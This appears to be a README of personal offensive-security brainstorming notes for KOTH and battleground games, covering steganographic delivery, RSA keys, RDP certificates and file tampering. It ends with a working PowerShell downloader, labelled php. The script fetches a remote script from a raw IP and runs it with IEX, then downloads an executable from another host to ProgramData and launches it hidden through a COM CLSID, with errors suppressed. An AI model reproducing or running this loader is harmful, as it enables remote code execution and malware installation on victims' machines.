# Squid-Games-PreBR


This is just were I ideas for BR

I really like the idea of stenography as a delivery mechanism as the VBA extracting and saving the image is similar to how a browser would save images in a cache 

Embedded RSA keys 

RDP certificates 

Hash collisioning files to make files has been a long term goal for over 6 years

- (This is big question I want to answer) how to:
	- Prevent file tampering
	- Tamper files
	- detect file tampering


Bad php for my KOTH and Battleground Arsenal, but better; is there a linux varation I could try instead of CLSIDs in how anything on Linux gets executed?
```php
$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
$method = [System.Net.WebClient].GetMethods();
foreach($m in $method){

  if($m.Name -eq "DownloadString"){
    try{
     $uri = New-Object System.Uri("http://176.32.35.16/704e.php")
     IEX($m.Invoke($instance, ($uri)));
    }catch{}

  }

  if($m.Name -eq "DownloadData"){
     try{
     $uri = New-Object System.Uri("http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
     $response = $m.Invoke($instance, ($uri));

     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
     [System.IO.File]::WriteAllBytes($path, $response);

     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
     $type = [Type]::GetTypeFromCLSID($clsid)
     $object = [Activator]::CreateInstance($type)
     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)

     }catch{}
     
  }
}

Exit;
```